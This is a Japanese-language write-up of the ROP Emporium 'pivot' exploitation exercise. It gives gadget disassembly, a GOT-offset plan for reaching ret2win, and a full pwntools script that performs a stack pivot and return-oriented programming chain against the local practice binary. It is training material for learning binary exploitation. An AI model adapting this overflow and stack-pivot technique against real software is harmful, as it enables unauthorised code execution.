# pivot (ROP Emporium 7)

## Information

### uselessFunction
```asm
00000000004009a8 <uselessFunction>:
  4009a8:	55                   	push   rbp
  4009a9:	48 89 e5             	mov    rbp,rsp
  4009ac:	e8 6f fd ff ff       	call   400720 <foothold_function@plt>
  4009b1:	bf 01 00 00 00       	mov    edi,0x1
  4009b6:	e8 95 fd ff ff       	call   400750 <exit@plt>
```

### foothold_function
```asm
000000000000096a <foothold_function>:
 96a:	55                   	push   rbp
 96b:	48 89 e5             	mov    rbp,rsp
 96e:	48 8d 3d ab 01 00 00 	lea    rdi,[rip+0x1ab]        # b20 <_fini+0xc>
 975:	e8 b6 fe ff ff       	call   830 <puts@plt>
 97a:	90                   	nop
 97b:	5d                   	pop    rbp
 97c:	c3                   	ret
```

### ret2win
```asm
0000000000000a81 <ret2win>:
 a81:	55                   	push   rbp
 a82:	48 89 e5             	mov    rbp,rsp
 a85:	48 83 ec 40          	sub    rsp,0x40
 a89:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR fs:0x28
 ...
```


### usefulGadgets
```asm
00000000004009bb <usefulGadgets>:
  4009bb:	58                   	pop    rax
  4009bc:	c3                   	ret
  4009bd:	48 94                	xchg   rsp,rax
  4009bf:	c3                   	ret
  4009c0:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4009c3:	c3                   	ret
  4009c4:	48 01 e8             	add    rax,rbp
  4009c7:	c3                   	ret
  4009c8:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
  4009cf:	00 
```

xchg: データの交換
-> pop raxと合わせてrspを任意の値にすることができる

```asm
0x00000000004009c0 : mov rax, qword ptr [rax] ; ret
0x00000000004006b0 : call rax
```
任意の位置を呼べる


### 2回目read
```asm
400985:	48 8d 45 e0          	lea    rax,[rbp-0x20]
400989:	ba 40 00 00 00       	mov    edx,0x40
40098e:	48 89 c6             	mov    rsi,rax
400991:	bf 00 00 00 00       	mov    edi,0x0
400996:	e8 75 fd ff ff       	call   400710 <read@plt>
```
0x40まで
-> offsetがあるので3 x 8バイトしか入れない

### heap address
```zsh
└─$ ./pivot
pivot by ROP Emporium
x86_64

Call ret2win() from libpivot
The Old Gods kindly bestow upon you a place to pivot: 0x7fcf557fff10
Send a ROP chain now and it will land there
> w
Thank you!

Now please send your stack smash
> w
Thank you!

Exiting
```
ここで出てきたアドレスが1回目readでの読み込み先
-> 後々ここにrspを飛ばしたい

## Solution
### Strategy
foothold_functionのGOT: 0x601040を +0x117 すればよい(ret2winにする)
- foothold_functionのアドレスを解決
- +0x117 する
- もう一回foothold_functionを呼び出す

#### +0x117
```asm
0x00000000004009c4 : add rax, rbp ; ret
0x00000000004007c8 : pop rbp ; ret
```
これで任意の値をraxに足せる

#### 手順
1. foothold_functionを呼ぶ
2. set rax: 0x601040
3. mov rax, qword ptr [rax] ; ret  # rax: foothold_functionのアドレス
4. add rax, rbp ; ret with rbp: 0x117
5. call rax

#### stack pivoting
1回目readの読み込み先をget
```python
conn.recvuntil('pivot: ')
pivot = int(conn.recvline().strip(), 16)
```

rspを飛ばす
1. set rax: pivot   
2. xchg rsp, rax ; ret


### Script
```python
from pwn import *

conn = process('./pivot')

conn.recvuntil('pivot: ')
pivot = int(conn.recvline().strip(), 16)
log.info('pivot: ' + hex(pivot))

payload = p64(0x400720)
payload += p64(0x4009bb)
payload += p64(0x601040)
payload += p64(0x4009c0)
payload += p64(0x4007c8)
payload += p64(0x117)
payload += p64(0x4009c4)
payload += p64(0x4006b0)

conn.sendlineafter('> ', payload)

payload = b'A' * 0x28
payload += p64(0x4009bb)
payload += p64(pivot)
payload += p64(0x4009bd)

conn.sendlineafter('> ', payload)
conn.interactive()
```